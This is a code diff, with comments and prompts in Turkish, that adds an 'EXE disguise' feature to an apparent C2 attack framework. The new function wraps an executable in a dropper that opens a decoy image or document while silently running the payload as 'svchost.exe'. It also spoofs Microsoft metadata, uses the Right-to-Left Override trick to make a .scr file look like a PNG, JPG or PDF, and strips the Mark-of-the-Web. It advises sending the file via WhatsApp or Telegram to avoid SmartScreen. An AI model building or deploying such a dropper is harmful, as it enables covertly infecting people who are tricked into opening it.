@@ -538,6 +538,146 @@ def c2_listener():
     input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")
 
 # ══════════════════════════════════════════════════════════
+#  EXE DISGUISE (KILIK DEĞİŞTİRME)
+# ══════════════════════════════════════════════════════════
+
+def c2_disguise():
+    clear_screen()
+    print_banner()
+    print(f"{C.YELLOW}[*] EXE Gizleme — Dosya Kılık Değiştirme{C.RESET}\n")
+    print_line()
+    print(f"{C.DIM}  EXE dosyanızı PNG/JPG/PDF gibi gösterir.{C.RESET}")
+    print(f"{C.DIM}  RLO Unicode trick + Sahte ikon + Yem dosya açma{C.RESET}\n")
+
+    # 1. EXE dosyasını seç
+    exe_path = input(f"{C.CYAN}  [?] EXE dosya yolu: {C.RESET}").strip().strip('"')
+    if not os.path.exists(exe_path):
+        print(f"{C.RED}  [-] Dosya bulunamadı: {exe_path}{C.RESET}")
+        input(f"\n{C.YELLOW}  Enter'a basın...{C.RESET}")
+        return
+
+    # 2. Kılık seç
+    print(f"\n  {C.CYAN}Hangi dosya türü olarak gizlensin?{C.RESET}")
+    print(f"  {C.WHITE}1){C.RESET} 🖼️  PNG Resim")
+    print(f"  {C.WHITE}2){C.RESET} 📷 JPG Fotoğraf")
+    print(f"  {C.WHITE}3){C.RESET} 📄 PDF Doküman")
+    print(f"  {C.WHITE}4){C.RESET} 📝 Word Doküman")
+    print(f"  {C.WHITE}5){C.RESET} 📊 Excel Dosya")
+    disguise_choice = input(f"\n{C.CYAN}  [>] Seçim: {C.RESET}").strip()
+
+    ext_map = {
+        '1': ('png', 'gnp'),
+        '2': ('jpg', 'gpj'),
+        '3': ('pdf', 'fdp'),
+        '4': ('docx', 'xcod'),
+        '5': ('xlsx', 'xslx'),
+    }
+    if disguise_choice not in ext_map:
+        disguise_choice = '1'
+    fake_ext, reversed_ext = ext_map[disguise_choice]
+
+    # 3. Dosya adı
+    base_name = input(f"{C.CYAN}  [?] Görünen dosya adı (ör: tatil_foto): {C.RESET}").strip() or "resim"
+
+    # 4. Yem dosya (opsiyonel)
+    print(f"\n{C.DIM}  [*] Yem dosya: EXE açılınca gösterilecek gerçek resim/doküman (opsiyonel){C.RESET}")
+    decoy_path = input(f"{C.CYAN}  [?] Yem dosya yolu (boş = yem yok): {C.RESET}").strip().strip('"')
+
+    # 5. Yem dosyayı EXE'ye göm (varsa)
+    if decoy_path and os.path.exists(decoy_path):
+        print(f"{C.YELLOW}  [*] Yem dosya gömülüyor...{C.RESET}")
+        # Wrapper oluştur: yem dosyayı aç + orijinal EXE'yi çalıştır
+        decoy_ext = os.path.splitext(decoy_path)[1]
+        with open(decoy_path, 'rb') as f:
+            decoy_b64 = base64.b64encode(f.read()).decode()
+        with open(exe_path, 'rb') as f:
+            exe_b64 = base64.b64encode(f.read()).decode()
+
+        wrapper_code = f'''import sys,os,base64,subprocess,tempfile
+try:
+    if sys.stdout is None: sys.stdout=open(os.devnull,"w")
+    if sys.stderr is None: sys.stderr=open(os.devnull,"w")
+except: pass
+tmp=tempfile.gettempdir()
+# Yem dosyayi ac
+decoy=os.path.join(tmp,"preview{decoy_ext}")
+with open(decoy,"wb") as f:
+    f.write(base64.b64decode("{decoy_b64}"))
+os.startfile(decoy)
+# Payload'i calistir
+payload=os.path.join(tmp,"svchost.exe")
+with open(payload,"wb") as f:
+    f.write(base64.b64decode("{exe_b64}"))
+subprocess.Popen([payload],creationflags=0x08000000)
+'''
+        wrapper_path = os.path.join('stealth_dropper', '_wrapper.py')
+        save_text(wrapper_path, wrapper_code)
+
+        # Nuitka ile derle
+        print(f"{C.YELLOW}  [*] Wrapper derleniyor...{C.RESET}")
+        final_exe = os.path.join('stealth_dropper', 'disguised.exe')
+        result = subprocess.run(
+            [sys.executable, '-m', 'nuitka',
+             '--onefile', '--windows-console-mode=disable',
+             '--output-dir=stealth_dropper',
+             '--output-filename=disguised.exe',
+             '--remove-output',
+             '--assume-yes-for-downloads',
+             '--windows-company-name=Microsoft Corporation',
+             '--windows-product-name=Windows Photo Viewer',
+             wrapper_path],
+            capture_output=True, text=True
+        )
+        try: os.remove(wrapper_path)
+        except: pass
+    else:
+        final_exe = exe_path
+
+    if not os.path.exists(final_exe):
+        print(f"{C.RED}  [-] Derleme başarısız!{C.RESET}")
+        if 'result' in dir() and result.stderr:
+            print(f"{C.RED}  {result.stderr[:300]}{C.RESET}")
+        input(f"\n{C.YELLOW}  Enter'a basın...{C.RESET}")
+        return
+
+    # 6. RLO trick ile yeniden adlandır
+    RLO = '\u202E'  # Right-to-Left Override
+    # Örnek: tatil_foto + RLO + gnp + .scr → tatil_fotorcs.png görünür
+    rlo_name = f"{base_name}{RLO}{reversed_ext}.scr"
+    rlo_path = os.path.join('stealth_dropper', rlo_name)
+
+    import shutil
+    shutil.copy2(final_exe, rlo_path)
+
+    # MOTW temizle
+    try:
+        subprocess.run(['powershell', '-c',
+            f'Remove-Item -Path "{os.path.abspath(rlo_path)}" -Stream Zone.Identifier -ErrorAction SilentlyContinue'],
+            capture_output=True)
+    except: pass
+
+    print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════════╗{C.RESET}")
+    print(f"{C.GREEN}{C.BOLD}  ║  ✅ EXE GİZLEME TAMAMLANDI!                         ║{C.RESET}")
+    print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════════╝{C.RESET}")
+    print(f"\n{C.WHITE}  📁 Dosya     : {os.path.abspath(rlo_path)}{C.RESET}")
+    print(f"{C.WHITE}  👁️  Görünüm   : {base_name}rcs.{fake_ext}{C.RESET}")
+    print(f"{C.WHITE}  📝 Gerçek Uzantı: .scr (Windows tarafından EXE gibi çalıştırılır){C.RESET}")
+    print(f"{C.WHITE}  🎭 Yem Dosya : {'Evet' if decoy_path and os.path.exists(decoy_path) else 'Hayır'}{C.RESET}")
+    print(f"{C.WHITE}  🔄 RLO Trick  : Aktif ✅{C.RESET}")
+    print(f"\n{C.YELLOW}  [!] Hedef dosyaya çift tıklayınca:{C.RESET}")
+    if decoy_path and os.path.exists(decoy_path):
+        print(f"{C.YELLOW}      1. Yem dosya (resim/döküman) açılır{C.RESET}")
+        print(f"{C.YELLOW}      2. Payload arka planda sessizce çalışır{C.RESET}")
+    else:
+        print(f"{C.YELLOW}      Payload arka planda sessizce çalışır{C.RESET}")
+    print(f"{C.YELLOW}  [!] WhatsApp/Telegram ile gönderin — SmartScreen çıkmaz!{C.RESET}")
+
+    if os.name == 'nt':
+        os.startfile(os.path.abspath('stealth_dropper'))
+
+    input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")
+
+# ══════════════════════════════════════════════════════════
 #  EXTERNAL TOOLS EXECUTOR
 # ══════════════════════════════════════════════════════════
 
@@ -728,8 +868,9 @@ def main_menu():
                 clear_screen()
                 print_banner()
                 print(f"{C.BOLD}  C2 FRAMEWORK:{C.RESET}\n")
-                print(f"  {C.CYAN}1){C.RESET} Payload Builder (Tek PNG / Shell)")
-                print(f"  {C.CYAN}2){C.RESET} Listener (Saldırgan Dinleyicisi)")
+                print(f"  {C.CYAN}1){C.RESET} Payload Builder (EXE Oluştur)")
+                print(f"  {C.CYAN}2){C.RESET} Listener (Dinleyici)")
+                print(f"  {C.CYAN}3){C.RESET} EXE Gizleme (PNG/JPG/PDF Kılığına Sok)")
                 print(f"  {C.CYAN}0){C.RESET} Geri Dön\n")
                 try:
                     c2c = input(f"{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
@@ -738,6 +879,7 @@ def main_menu():
 
                 if c2c == '1': c2_payload_builder()
                 elif c2c == '2': c2_listener()
+                elif c2c == '3': c2_disguise()
                 elif c2c == '0': break
         elif choice == '0':
             clear_screen()
